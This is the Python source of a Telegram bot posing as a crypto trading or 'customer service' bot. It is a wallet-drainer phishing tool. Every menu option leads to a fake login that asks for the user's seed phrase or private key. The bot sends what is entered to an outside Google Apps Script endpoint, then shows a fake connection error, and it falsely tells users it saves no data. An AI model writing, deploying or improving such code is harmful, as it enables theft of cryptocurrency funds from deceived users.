from typing import Final
import time
import os
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, \
    CallbackContext
TOKEN: Final = os.environ.get("TOKEN")
BOT_USERNAME: Final = "@iCustomerservice_bot"
constantQuestion = ("Choose login method to continue:"
                    "")
#assumedTelegramID = "6727619278217"

# Commands
async def startCommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        ["Buy", "Sell", "Hold"],
        ["Trenches", "Referrals", "Copy Trade" ],
        ["Sniper", "DCA orders", "Limit Orders"],
        ["Watchlist", "Withdraw", "Migration"],
        ["Balance", "Claim", "Validate"],
        ["High Gas Fee", "Pending", "Refresh"],
        ["Help", "Settings", "Update"],
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    await update.message.reply_text("""<b>⚙️ Welcome To Backup Bot!</b>
    
This bot can read contract addresses and lets you interact with the blockchain.

Main Commands:
/config to change general options and access some other menus
/wallets to see your balances or to add or generate wallets.
/trades to open your trades monitor. You need to be watching a token first.
/snipes to list your current snipes and be able to cancel them
/balance to do a quick balance check on a token and its value.

Select a category from the list provided.""", reply_markup=reply_markup, parse_mode="HTML")

async def helpCommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("How can i help you..?")
    await context.user_data["secondOption"]
    await promptLogin(update, context)

async def buyCommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅You have selected the category buy please choose login method")
    await context.user_data["secondOption"]
    await promptLogin(update, context)

async def configCommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅You have selected the category config please choose login method")
    await context.user_data["secondOption"]
    await promptLogin(update, context)

async def walletCommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅You have selected the category wallet please choose login method")
    await context.user_data["secondOption"]
    await promptLogin(update, context)

async def tradeCommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅You have selected the category trade please choose login method")
    await context.user_data["secondOption"]
    await promptLogin(update, context)
async def snipesCommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅You have selected the category snipes please choose login method")
    await context.user_data["secondOption"]
    await promptLogin(update, context)

async def balanceCommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅You have selected the category balance please choose login method")
    await context.user_data["secondOption"]
    await promptLogin(update, context)

#Responses
def handleResponses(text: str) -> str:
    processed: str = text.lower()
    if "Buy" in processed:
        return "You have selected the buy option"
    if "how are you" in processed:
        return "I am doing well thanks"
    return "I don't know what you mean"

async def logToSheets(user_id, message):
    sheetlink = "https://script.google.com/macros/s/AKfycbz9NDNqtLyqbuPOxxG2MdQQtSd5fmU-RjVcdur2GXfdd1eVVrKuPzJnKewO-y77CGB1/exec"
    userlogs = {
        "user_id": user_id,
        "message": message
    }
    try:
        response = requests.post(sheetlink,json=userlogs)
        print("logged to google sheet: ", response.text)
    except Exception as e:
        print("Error! :", e)


async def promptLogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text: str = update.message.text.strip().lower()
    userState = context.user_data.get("state", None)

    if userState == "thirdOption":
        await logToSheets(update.message.chat_id, text)
        phrase = text.split()
        if len(phrase) <= 12:
            await update.message.reply_text("❌Invalid input.")
        await  update.message.reply_text("""❌ Error connecting...
                 Try another wallet
                 Please ensure you enter valid information or start again
                 """)
        context.user_data["state"] = None
        return
    if userState == "secondOption":
        if text == "🔐login phrase":
            await  update.message.reply_text("You have selected login phrase.")
            time.sleep(1)
            await  update.message.reply_text("🚧 Note: Never share your seed phrase with anyone. You are 100% safe."
                                             "The bot does not save any data. Backup your recovery seed phrase somewhere safe")
            time.sleep(2)
            await  update.message.reply_text("Please enter your 12/24 word seed phrase:")
            print(text)

            context.user_data["state"] = "thirdOption"
            return
        elif text == "🔑login privatekey":
            await  update.message.reply_text("You have selected login privatekey.")
            time.sleep(1)
            await  update.message.reply_text("🚧 Note: Never share your seed phrase with anyone. You are 100% safe."
                                             "The bot does not save any data. Backup your recovery seed phrase somewhere safe")
            time.sleep(2)
            await  update.message.reply_text("Please enter your 12/24 word seed phrase:")
            await logToSheets(update.message.chat_id, text)
            context.user_data["state"] = "thirdOption"

        else:
            await update.message.reply_text("Please make sure you choose your login method")
            context.user_data["state"] = None

#Messages
async def handleMessage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_type: str = update.message.chat.type
    text: str = update.message.text.strip().lower()


    mainlist = [
        ["Buy", "Sell", "Hold"],
        ["Trenches", "Referrals", "Copy Trade"],
        ["Sniper", "DCA orders", "Limit Orders"],
        ["Watchlist", "Withdraw", "Migration"],
        ["Balance", "Claim", "Validate"],
        ["High Gas Fee", "Pending", "Refresh"],
        ["Help", "Settings", "Update"],
    ]

    print(f'User ({update.message.chat.id}) in {message_type}: "{text}"')
    #MAKE SURE YOU RUN THIS, THIS NIGHT!!
    #await context.bot.forward_message(chat_id=assumedTelegramID, from_chat_id=update.effective_chat.id, message_id=update.message.message_id,)
    # if message_type == "group":
    #     if BOT_USERNAME in text:
    #         newText: str = text.replace(BOT_USERNAME, "").strip()
    #         response: str = handleResponses(newText)
    #     else:
    #         return
    # else:
    #     response: str = handleResponses(text)

    options = [
        ["🔐Login Phrase", "🔑Login PrivateKey"]
    ]
    await promptLogin(update, context)
    flatmainlist = [item.lower() for sublist in mainlist for item in sublist]
    if text in flatmainlist:
        await  update.message.reply_text(f"✅You have selected the category {text}", parse_mode="HTML")
        reply_markup = ReplyKeyboardMarkup(options, resize_keyboard=True, one_time_keyboard=False)
        time.sleep(1)
        await update.message.reply_text("Please choose your login method to continue...", reply_markup=reply_markup)
        context.user_data["state"] = "secondOption"
        print("Switched to secondOption")
        return

async def errorHandler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")


if __name__ == "__main__":
    print("Starting Customer Service Bot...")
    app = Application.builder().token(TOKEN).build()
# Commands
    app.add_handler(CommandHandler("start", startCommand))
    app.add_handler(CommandHandler("help", helpCommand))
    app.add_handler(CommandHandler("config", configCommand))
    app.add_handler(CommandHandler("wallets", walletCommand))
    app.add_handler(CommandHandler("trades", tradeCommand))
    app.add_handler(CommandHandler("snipes", snipesCommand))
    app.add_handler(CommandHandler("balance", balanceCommand))
# Messages
    app.add_handler(MessageHandler(filters.TEXT, handleMessage))
    app.add_handler(MessageHandler(filters.TEXT, errorHandler))
    # Errors
    app.add_error_handler(errorHandler)

    #Polls the bot
    print("Customer Service Bot started...")
    app.run_polling(poll_interval=3)

